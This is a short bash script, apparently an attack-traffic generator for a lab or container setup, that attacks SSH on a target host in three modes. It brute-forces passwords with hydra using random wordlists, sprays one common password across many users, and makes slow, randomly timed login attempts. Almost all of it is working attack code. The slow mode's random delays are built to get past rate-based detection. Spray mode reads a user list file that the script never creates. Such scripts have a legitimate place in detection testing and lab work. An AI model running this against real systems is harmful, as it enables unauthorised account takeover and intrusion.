#!/bin/bash
# MODE: single | spray | slow   TARGET_USERS: space separated usernames to guess
set -u
until nc -z "$TARGET_HOST" 22; do sleep 1; done
mkwordlist() { shuf -n "$1" /usr/share/dict/words 2>/dev/null || seq 1 "$1" | sed 's/^/pw_/'; }
case "$MODE" in
  single)
    for i in $(seq 1 "${BURSTS:-12}"); do
      u=$(echo "$TARGET_USERS" | tr ' ' '\n' | shuf -n1)
      mkwordlist "${TRIES:-50}" > /tmp/wl.txt
      hydra -l "$u" -P /tmp/wl.txt -s 22 "ssh://$TARGET_HOST" -t 4 -f -w 4 2>&1 | tail -1
      sleep "${GAP:-900}"
    done ;;
  spray)
    for i in $(seq 1 "${BURSTS:-12}"); do
      echo "${SPRAY_PW:-Summer2026}" > /tmp/p.txt
      hydra -L /tmp/userlist.txt -P /tmp/p.txt -s 22 "ssh://$TARGET_HOST" -t 4 -f -w 4 2>&1 | tail -1
      sleep "${GAP:-900}"
    done ;;
  slow)
    end=$((SECONDS + ${DURATION_S:-86400}))
    while [ $SECONDS -lt $end ]; do
      u=$(echo "$TARGET_USERS" | tr ' ' '\n' | shuf -n1)
      sshpass -p "wrongpass_$RANDOM" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$u@$TARGET_HOST" true 2>/dev/null
      sleep $(( (RANDOM % 3600) + 900 ))
    done ;;
esac
sleep infinity
